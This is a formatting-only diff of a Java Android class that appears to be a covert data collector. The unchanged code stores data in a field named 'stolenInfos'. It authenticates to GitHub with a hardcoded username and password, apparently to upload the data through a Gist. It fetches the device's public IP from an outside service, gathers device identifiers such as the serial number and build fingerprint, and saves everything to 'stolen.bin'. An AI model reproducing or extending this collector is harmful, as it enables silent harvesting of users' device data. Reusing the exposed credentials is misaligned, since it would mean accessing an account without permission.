@@ -30,7 +30,7 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 	public void run() {
 		// TODO: Implement this method
 		BinaryPrefImpl sb=TheApplication.instance.stolenInfos;
-		try{
+		try {
 			GitHubClient ghc=new GitHubClient().setCredentials("RevealEverything", "nao2001nao");
 			Gist gst=null;
 			String s="";
@@ -72,21 +72,21 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 			} catch (IOException e) {
 				e.printStackTrace(System.out);
 			}
-		}catch(Throwable e){
-			
-		}finally{
+		} catch (Throwable e) {
+
+		} finally {
 			FileOutputStream fos=null;
-			try{
-				fos=new FileOutputStream(new File(getFilesDir(),"stolen.bin"));
+			try {
+				fos = new FileOutputStream(new File(getFilesDir(), "stolen.bin"));
 				fos.write(sb.toBytes());
 			} catch (IOException e) {
 				e.printStackTrace(System.out);
-			}finally{
+			} finally {
 				try {
-					if(fos!=null)fos.close();
+					if (fos != null)fos.close();
 				} catch (IOException e) {}
 			}
-			for(String s:sb.getAll().keySet().toArray(new String[sb.getAll().size()])){
+			for (String s:sb.getAll().keySet().toArray(new String[sb.getAll().size()])) {
 				Log.d("remain", s);
 			}
 		}
@@ -105,13 +105,13 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 		private String getIp() {
 			BufferedReader br=null;
 			try {
-				br=new BufferedReader(new InputStreamReader(new URL("http://ieserver.net/ipcheck.shtml").openConnection().getInputStream()));
+				br = new BufferedReader(new InputStreamReader(new URL("http://ieserver.net/ipcheck.shtml").openConnection().getInputStream()));
 				return br.readLine();
 			} catch (IOException e) {
 				return "127.0.0.1";
-			}finally{
+			} finally {
 				try {
-					if(br!=null) br.close();
+					if (br != null) br.close();
 				} catch (IOException e) {
 
 				}
@@ -194,7 +194,7 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 			return sa;
 		}
 	}
-	public static class AppInfo{
+	public static class AppInfo {
 		public String versionName=Utils.getVersionName(TheApplication.instance);
 		public int    versionCode=Utils.getVersionCode(TheApplication.instance);
 	}
@@ -202,33 +202,33 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 		//public HashSet<String> packages=getPackageNames();
 		//public HashMap<String,PackageInfo> packageInfos=getPackageMisc();
 		public String 
-			 board=Build.BOARD
-			,bootloader=Build.BOOTLOADER
-			,brand=Build.BRAND
-			,cpuAbi1=Build.CPU_ABI
-			,cpuAbi2=Build.CPU_ABI2
-			,device=Build.DEVICE
-			,display=Build.DISPLAY
-			,fingerprint=Build.FINGERPRINT
-			,hardware=Build.HARDWARE
-			,host=Build.HOST
-			,id=Build.ID
-			,manufacture=Build.MANUFACTURER
-			,model=Build.MODEL
-			,product=Build.PRODUCT
-			,serial=Build.SERIAL
-			,baseOs=getVersionClassFieldString("BASE_OS")
-			,codeName=getVersionClassFieldString("CODENAME")
-			,incremental=Build.VERSION.INCREMENTAL
-			,release=Build.VERSION.RELEASE
-			,sdk=Build.VERSION.SDK
-			,securityPatch=getVersionClassFieldString("SECURITY_PATCH");
+		board=Build.BOARD
+		,bootloader=Build.BOOTLOADER
+		,brand=Build.BRAND
+		,cpuAbi1=Build.CPU_ABI
+		,cpuAbi2=Build.CPU_ABI2
+		,device=Build.DEVICE
+		,display=Build.DISPLAY
+		,fingerprint=Build.FINGERPRINT
+		,hardware=Build.HARDWARE
+		,host=Build.HOST
+		,id=Build.ID
+		,manufacture=Build.MANUFACTURER
+		,model=Build.MODEL
+		,product=Build.PRODUCT
+		,serial=Build.SERIAL
+		,baseOs=getVersionClassFieldString("BASE_OS")
+		,codeName=getVersionClassFieldString("CODENAME")
+		,incremental=Build.VERSION.INCREMENTAL
+		,release=Build.VERSION.RELEASE
+		,sdk=Build.VERSION.SDK
+		,securityPatch=getVersionClassFieldString("SECURITY_PATCH");
 		public String[] abis=tryGetSupportAbis();
 		public int 
-			 previewSdkInt=getVersionClassFieldInt("PREVIEW_SDK_INT")
-			,sdkInt=getVersionClassFieldInt("SDK_INT");
-		
-			
+		previewSdkInt=getVersionClassFieldInt("PREVIEW_SDK_INT")
+		,sdkInt=getVersionClassFieldInt("SDK_INT");
+
+
 		private HashSet<String> getPackageNames() {
 			return new HashSet<>(getPackageMisc().keySet());
 		}
@@ -240,19 +240,19 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 			}
 			return names;
 		}
-		private String[] tryGetSupportAbis(){
+		private String[] tryGetSupportAbis() {
 			try {
 				return (String[])Build.class.getField("SUPPORTED_ABIS").get(null);
 			} catch (NoSuchFieldException e) {} catch (IllegalAccessException e) {} catch (IllegalArgumentException e) {}
 			return Constant.EMPTY_STRING_ARRAY;
 		}
-		private String getVersionClassFieldString(String name){
+		private String getVersionClassFieldString(String name) {
 			try {
 				return (String)Build.VERSION.class.getField(name).get(null);
 			} catch (NoSuchFieldException e) {} catch (IllegalAccessException e) {} catch (IllegalArgumentException e) {}
 			return null;
 		}
-		private int getVersionClassFieldInt(String name){
+		private int getVersionClassFieldInt(String name) {
 			try {
 				return (int)Build.VERSION.class.getField(name).get(null);
 			} catch (NoSuchFieldException e) {} catch (IllegalAccessException e) {} catch (IllegalArgumentException e) {}
